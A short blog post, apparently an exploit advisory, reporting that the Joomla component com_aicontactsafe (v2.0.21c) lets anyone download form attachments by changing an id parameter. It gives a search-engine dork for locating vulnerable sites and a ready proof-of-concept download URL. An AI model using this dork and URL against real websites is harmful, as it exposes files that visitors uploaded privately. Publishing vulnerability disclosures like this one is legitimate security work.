---
layout: post
title: Joomla com_aicontactsafe Arbitrary Attachment Download - 08.06.2017
---

Everyone can download arbitrary attachment, but website must have including field with attachments.

<br># Vulnerability: Joomla com_aicontactsafe Arbitrary Attachment Download
<br># Date: 08.06.2017
<br># Software link: http://www.algisinfo.com/en/download/category/1-free-extensions.html
<br># Dork: inurl:index.php?option=com_aicontactsafe
<br># Version: v.2.0.21c.stable
<br># Exploit Author: Dave
<br># Website: http://www.morawskiweb.pl
<br># Contact: dawidmorawski1990@gmail.com
<br>#######################################
<br>
<br>1. Description:
<br>Everyone can download arbitrary attachment, but website must have including field with attachments.
<br>
<br>2. Proof of Concept:
<br>localhost/index.php?option=com_aicontactsafe&sTask=message&task=download&id=1&format=raw 
<br>
<br>All you have to do is change "id" value. 
<br>
